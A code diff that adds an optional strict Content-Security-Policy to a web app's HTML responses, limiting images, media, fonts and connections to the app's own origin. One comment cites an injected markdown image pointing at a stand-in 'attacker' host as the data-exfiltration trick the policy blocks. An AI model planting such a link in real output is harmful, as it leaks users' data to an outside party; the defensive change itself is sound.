@@ -63,6 +63,25 @@ const SVG_CONTENT_SECURITY_POLICY = "default-src 'none'; style-src 'unsafe-inlin
 const HTML_CONTENT_SECURITY_POLICY =
   "sandbox allow-scripts allow-forms allow-popups allow-downloads";
 
+// Opt-in (T3CODE_WEB_STRICT_CSP): the browser may load media, fonts and connections only from this
+// origin, so an injected `![](https://attacker/?q=...)` cannot leave. data: and blob: stay local.
+// Inline scripts and styles come from index.html's theme and boot-error snippets.
+const WEB_APP_STRICT_CONTENT_SECURITY_POLICY = [
+  "default-src 'self'",
+  "script-src 'self' 'unsafe-inline' 'wasm-unsafe-eval'",
+  "style-src 'self' 'unsafe-inline'",
+  "img-src 'self' data: blob:",
+  "media-src 'self' data: blob:",
+  "font-src 'self' data:",
+  "connect-src 'self' data: blob:",
+  "worker-src 'self' blob:",
+  "frame-src 'self' blob:",
+  "object-src 'none'",
+  "base-uri 'self'",
+  "form-action 'self'",
+  "frame-ancestors 'self'",
+].join("; ");
+
 // Proxies may strip disposition; force document-capable downloads to octet-stream.
 const DOWNLOAD_MIME_TYPE_PATTERN = /^[\w!#$&^.+-]+\/[\w!#$&^.+-]+$/;
 const isSafeDownloadMimeType = (mimeType: string): boolean =>
@@ -687,6 +706,9 @@ const handleStaticAndDevRequest = Effect.fn("handleStaticAndDevRequest")(
     const headers: Record<string, string> = {
       "Cache-Control": cacheControl,
       ...validators(fileInfo),
+      ...(isHtml && config.webStrictCsp
+        ? { "Content-Security-Policy": WEB_APP_STRICT_CONTENT_SECURITY_POLICY }
+        : {}),
     };
     const etag = headers.ETag;
     const lastModified = headers["Last-Modified"];
